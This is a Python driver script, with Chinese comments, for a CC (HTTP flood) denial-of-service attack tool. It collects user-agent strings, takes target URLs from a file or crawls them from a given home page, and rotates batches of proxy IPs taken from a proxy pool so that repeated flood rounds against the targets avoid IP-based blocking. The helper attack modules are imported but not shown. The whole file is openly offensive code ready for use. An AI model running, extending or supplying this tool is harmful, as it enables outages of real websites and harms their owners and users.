from time import sleep
from CcCrawl import CcCrawl
from ProxySpider import ProxySpider
from PageCrawl import PageCrawl
import threading
import os
from random import randrange


# 另起一线程获取ip
def getproxy(ProxySpider, sleep_time):
    while True:
        ProxySpider.run()
        # 休息10s重新获取新的ip
        sleep(sleep_time)


if __name__ == '__main__':

    headers = list()
    if os.path.exists("useragents"):
        txt_list = os.listdir("useragents")
        os.chdir("useragents")
        for txt in txt_list:
            try:
                with open("{}".format(txt), 'r', encoding="UTF-8") as f:
                    headers.extend(f.read().split('\n'))
            except Exception:
                continue

    # 发起一次CC攻击需要的ip量
    m = int(input("请输入发起一次CC攻击需要的ip量: "))
    # sleep_time = int(input("睡眠时间: "))
    urls_path = input("是否指定urls.txt路径: ")
    if urls_path == '':
        home_url = input("请指定home_url: ")
        page_num = int(input("请指定page_num: "))

        PageCrawl = PageCrawl(home_url, headers, page_num)
        target_urls = PageCrawl.run()
    else:
        with open(urls_path, 'r', encoding='UTF-8') as f:
            target_urls = f.read().split('\n')

    CcCrawl = CcCrawl(1, target_urls=target_urls, headers=headers)
    ProxySpider = ProxySpider(m, proxypool_url='http://192.168.99.100:5555/random')

    # 另起一线程获取ip
    t = threading.Thread(target=getproxy, args=[ProxySpider, 60])
    # 线程启动
    t.start()

    print("程序开始执行")

    # 主线程实现cc攻击
    while True:
        # 当重新拿到一定量随机ip后发起攻击
        if len(ProxySpider.ip_list) >= m:
            CcCrawl.run(ProxySpider.ip_list[:m])
            # 清空已用过的ip列表"""
            del ProxySpider.ip_list[:m]

        sleep(randrange(60, 180, 60))
